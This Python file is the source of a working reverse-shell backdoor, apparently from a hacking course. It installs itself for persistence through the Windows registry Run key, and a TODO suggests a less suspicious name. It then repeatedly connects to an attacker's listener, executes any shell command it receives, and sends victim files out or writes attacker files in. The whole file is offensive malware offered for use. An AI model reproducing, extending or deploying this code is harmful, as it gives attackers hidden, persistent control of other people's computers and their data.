import socket
import subprocess
import json
import sys
import os
import base64
import shutil


class ReverseBackdoor:
	
	def __init__(self, ip:str, port:int)->None:
		'''
		description: Reverse backdoor class creates a backdoor by connecting to the attacker's machine server through TCP socket. 
		params: ip(str), port(int)
		returns: None
		'''
		self.create_persistence()
		
		self.port = port 
		self.ip = ip
		
		# creating a socket : socket.socket(family=AF_INET, type=SOCK_STREAM, proto=0, fileno=None)
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connect_to_listener()
		

	def create_persistence(self, backdoor_name:str='MyBackdoor.exe'):
		'''
		description: tries to connect to user when machine restarts.
		params: None
        returns: None
		'''
		if os.name == 'nt':
			# TODO: Change MyBackdoor to something less suspectful before creating exe
			backdoor_file_path = f'{os.environ["appdata"]}\\{backdoor_name}'
			if not os.path.exists(backdoor_file_path):
				shutil.copy(sys.executable, backdoor_file_path)
				subprocess.call(f'reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v {backdoor_name.removesuffix(".exe")} /t REG_SZ /d "{backdoor_file_path}"')


	def connect_to_listener(self):
		'''
		description: tries to connect to attacker's machine untill connected successfully. 
		params: None
        returns: None
		'''
		connected = False
		while not connected:
			try:
				self.connection.connect((self.ip,self.port))
				connected = True
				# self.serial_send('\r[*] Connection Established.')
			except ConnectionRefusedError:
				# print('\r[-] Connection Refused.', end='')
				continue


	def serial_send(self, data:str or list or bytes):
		'''
		description: serialize data and send over TCP socket.
		params: data (str or list)
        returns: None
		'''
		if type(data) == bytes:
			data = str(data, encoding='utf-8')
		
		bytes_json_data = json.dumps(data).encode('utf-8')
		# print('BD sent: ',bytes_json_data)
		self.connection.send(bytes_json_data)


	def serial_receive(self) -> str :
		'''
        description: receive serialized data over TCP socket
        and retrieve original data.
		params: None
        returns: bytes
		'''
		bytes_json_data = b''
		while True:
			try:
				bytes_json_data += self.connection.recv(1024)
				data = json.loads(bytes_json_data)
				# print("Backdoor Rec: ", data)
				return data 
			except json.JSONDecodeError:
				continue


	def execute_command(self,command:str)->str:
		'''
		description: executes command and return command's output.
		params: command(str)
        returns: str
		'''
		return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode('utf-8')


	def cwd(self,path):
		'''
		description: change working directory to the passed path.
		params: path(str)
        returns: str
		'''
		os.chdir(path)
		return '[*] Path changed to ' + path


	def upload_file(self, path):
		'''
		description: upload file contents to the attacker server.
		params: path(str or bytes)
        returns: bytes
		'''
		if os.path.isfile(path):
			with open(path, 'rb') as file:
				file_content = file.read()
				base64_file_content = base64.b64encode(file_content)
				return base64_file_content
		else:
			return f"[-] Exception : File {path} doesn't exist."


	def write_file(self, path, content)->str:
		'''
		description: write downloaded contents from the victim 
		to the specified path file.
		params: path, content
        returns: str
		'''
		with open(path, 'wb') as file:
			bytes_content = base64.b64decode(content)
			file.write(bytes_content)
			return (f"[*] File {path} Downloaded successfully on Victim's machine.")
	
	
	def upload_dir_files(self, path)->str:
		r'''
		uploads directory files to the hacker's machine. 
		'''
		if os.path.isdir(path):
			dir_files = os.listdir(path)
			files_count = str(len(dir_files))
			self.serial_send(files_count)
			# for file in dir_files:
			# 	if os.path.isfile(file):
			# 		self.upload_file(file)

			# download is wrt hacker's machine
			return f'[*] dir {path} files downloaded successfully.'
		else:
			return f'[-] Error while downloading dir {path} files'
	
	def run(self):
		'''
		description: start backdoor.
		params: None
        returns: None
		'''
		while True:
			try:
				command = self.serial_receive()
				
				# remove below line
				command_lst = command.split(' ')
				# print(command_lst)
				command_list_len = len(command_lst)>=2
				cmd = command_lst[0]
				if command_list_len:
					path = command_lst[1]
				
				# all these commands are wrt attacker.
				if cmd == 'exit' :
					self.serial_send("[!] Victim's connection has been closed.")
					self.connection.close()
					sys.exit()
				
				elif cmd == 'cd' and command_list_len:
					command_output = self.cwd(path)
				
				elif cmd =='download' and command_list_len:
					file_content = self.upload_file(path)
					command_output = str(file_content, encoding='utf-8')

				elif cmd == 'upload' and len(command_lst)==3:
					file_contents = command_lst[2]
					command_output = self.write_file(path, file_contents)
				
				elif command == 'download_dir_files' and command_list_len:
					dir_name = path
					command_output = self.upload_dir_files(dir_name)
				else:
					command_output = self.execute_command(command)

				self.serial_send(command_output)

			except json.JSONDecodeError:
				print('[-] Lost Connection.')
				self.connect_to_listener()

			except Exception as e:
				exception = ('[-] Exception : ' + str(e))
				self.serial_send(exception)


if __name__ == '__main__':
	try :
		backdoor = ReverseBackdoor(ip='127.0.0.1', port=4444)
		backdoor.run()
	except Exception as e:
		print('Exception :',e)
